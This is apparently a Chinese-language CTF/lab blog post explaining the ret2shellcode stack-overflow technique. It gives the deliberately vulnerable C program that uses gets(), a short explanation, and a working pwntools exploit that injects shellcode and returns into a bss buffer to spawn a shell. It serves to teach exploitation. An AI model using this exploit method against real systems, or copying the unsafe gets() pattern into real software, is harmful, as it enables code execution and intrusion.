---
layout:     post
title:      ret2shellcode
subtitle:   解题思路
date:       2018-07-05
author:     Mao
header-img: img/post-bg-cook.jpg
catalog: true
tags:
    - PWN
    - 栈溢出
---



本文讲解栈溢出

环境要求

> ubuntu 16.04 64bit
>
> python 2.7



所需工具

> pwntools
>
> gdb-peda
>
> 32位 ida



[程序下载](https://maoshuu.oss-cn-beijing.aliyuncs.com/elf/ret2shellcode)



第八行，gets函数存在溢出，ret2shellcode程序没有system，不能直接像ret2text一样利用程序中已有的system('/bin/sh')代码

![image-20180911162609611](http://maoshuu.oss-cn-beijing.aliyuncs.com/blog/2018-09-11-084850.png)



但是相比ret2text多了一个strncpy函数，这个函数的作用是把s中的内容拷贝到buf2中

第一个参数为buf2为目的地址，&s为源地址，0x64u为buf2长度

```c
char *strncpy(char *dest, const char *src, size_t n);

strncpy(buf2, &s, 0x64u);
```

所以这里就出现了一个思路，自己构造shellcode，通过strncpy拷贝到buf2中，然后main函数的返回地址覆盖为buf2的地址

```python
buf2_addr = 0x0804A080
shellcode = asm(shellcraft.sh()) #pwntools自带的模块

sh.sendline(shellcode.ljust(112, 'a') + p32(buf2_addr))
#shellcode.ljust(112, 'a'）左填充
```



> buf2属于全局未初始化变量，在程序编译运行时候，在bss段中，地址固定不变
>
> buf属于局部未初始化变量，每一次程序加载运行在内存中的地址都是变化的

```c
ret2shellcode.c

#include <stdio.h>
#include <string.h>

char buf2[100];

int main(void)
{
    setvbuf(stdout, 0LL, 2, 0LL);
    setvbuf(stdin, 0LL, 1, 0LL);

    char buf[100];

    printf("No system for you this time !!!\n");
    gets(buf);
    strncpy(buf2, buf, 100);
    printf("bye bye ~");

    return 0;
}
```



exp：

```python
#!/usr/bin/env python

from pwn import *

remote_is = 1

if remote_is:
	sh = remote('127.0.0.1', 4444)
else:
	sh = process('./ret2shellcode')

buf2_addr = 0x0804A080
shellcode = asm(shellcraft.sh())

sh.sendline(shellcode.ljust(112, 'a') + p32(buf2_addr))

sh.interactive()
```



